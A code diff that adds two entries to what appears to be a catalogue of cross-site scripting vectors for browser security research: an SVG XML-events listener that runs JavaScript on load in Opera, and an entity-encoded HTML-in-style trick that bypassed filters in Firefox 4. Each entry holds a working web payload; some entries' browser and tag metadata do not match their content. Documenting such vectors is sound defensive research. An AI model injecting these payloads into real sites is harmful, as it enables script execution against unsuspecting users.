@@ -4358,5 +4358,69 @@ var items =
         },
         'tags'      : [ 'quicktime', 'html', 'event', 'object', 'classid', 'xss'],
         'reporter'  : '.mario'
+    },	
+    { /* ID 127 - JavaScript execution on Opera via listener delegation */
+        'id'        : 127,
+        'category'  : 'svg',
+        'name'      : {
+            'en'    : 'JavaScript execution on Opera via listener delegation',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'data'      : '<svg xmlns="http://www.w3.org/2000/svg" id="x">\r\n<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>\r\n<handler id="y">alert(1)</handler>\r\n</svg>',
+        'description' : {
+            'en'    : 'The example vector - relating to #94 - shows how a combination of listener and hander tags can be used to delegate a load event from the SVG element to actual JavaScripe execution. So far only Opera supports the usage of XML events and related elements. No user interaction is required to execute the JavaScript.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'urls'      : ['http://www.opera.com/docs/specs/presto29/svg/elements/', 'http://www.w3.org/TR/2010/NOTE-xml-events2-20101216/Overview.html#section-eventhandlers', '#94'],
+        'howtofix'  : {
+            'en'    : '',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'browsers'  : {
+			'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'      : [ 'quicktime', 'html', 'event', 'object', 'classid', 'xss'],
+        'reporter'  : '.mario'
+    },
+    { /* ID 128 - Firefox parsing entity encoded HTML in SVG */
+        'id'        : 128,
+        'category'  : 'svg',
+        'name'      : {
+            'en'    : 'Firefox parsing entity encoded HTML in SVG',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'data'      : '<svg><style>&ltimg/scr=x onerror=%js_alert%// </b>',
+        'description' : {
+            'en'    : 'Firefox 4 allows HTML entities used in plain-text tags such as style, nostyle, noframes and others to represent their canonical form. This leads to possibilities bypassing filters despite of proper HTML encoding as the example demonstrates - especially when inline SVG is being used. This bug has been fixed in most recent Firefox versions.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'urls'      : ['http://www.mozilla.org/security/announce/2011/mfsa2011-27.html', 'https://developer.mozilla.org/en/svg_in_html_introduction'],
+        'howtofix'  : {
+            'en'    : '',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : ''
+        },
+        'browsers'  : {
+			'firefox': ['4.0']
+        },
+        'tags'      : [ 'svg', 'xss', 'inline', 'entities', 'firefox', 'css', 'xml'],
+        'reporter'  : '.mario'
     }	
 ]
